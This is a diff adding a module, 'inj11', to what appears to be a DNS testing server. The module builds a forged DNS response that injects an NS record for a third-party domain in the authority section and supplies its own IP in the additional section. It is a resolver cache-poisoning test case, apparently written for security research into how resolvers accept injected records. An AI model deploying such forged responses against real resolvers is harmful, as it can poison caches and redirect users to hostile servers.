@@ -1,0 +1,47 @@
+[module]
+name = "inj11"
+info = "Injection 11 - Inject NS record variant 2"
+desc = "Respond with empty answer, but include information in the AUTHORITY section that NS for whatever.com is ns1.yourdomain.com.whatever.com and in the ADDITIONAL section, provide our IP for the ns1.yourdomain.com.whatever.com."
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("inj11"):
+   # Send no answer, but send a NS record in the Authority section for
+   # another domain + IP of the NS in the Additional section
+   injns = "ns1." + req.sld_tld_domain + "." + a3rdparty_domain
+   injdom = a3rdparty_domain
+   addedquestions = b''
+   if "3rdparty" in req.subdomains:  # inject a 3rd party domain
+      injns   = "ns1." + injdom + "." + req.sld_tld_domain
+   injnsip = ZONEFILE[injns.lower()]["A"]
+   if "replq" in req.subdomains:  # replace the question with our injected stuffs
+      orig_req_domain = req.full_domain
+      req.full_domain = injdom
+      addcustomlog("REPLQ")
+   if "addq" in req.subdomains:  # add additional question for our injected stuffs
+      resp.QURR = req.QURR+1
+      addedquestions  = convDom2Bin(injdom) + req.type_bin + req.class_bin
+      addcustomlog("ADDQ")
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x84\x00', resp.QURR, 0, 1, 1)
+   ### QUESTION SECTION ########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+   buffer += addedquestions
+   ### ANSWER SECTION ########
+   ### empty
+   ### AUTHORITY SECTION ########
+   buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", len(injns)+2)     ## Data length
+   buffer += convDom2Bin(injns)                  ## NS hostname
+   ### ADDITIONAL SECTION ########
+   buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", 4)                ## Data length
+   buffer += socket.inet_aton(injnsip)           ## IP
+   # log and send
+   log("empty + %s NS -> %s -> %s" % (injdom, injns, injnsip))
+   send_buf(self, buffer)
+   #####################################################################
+'''
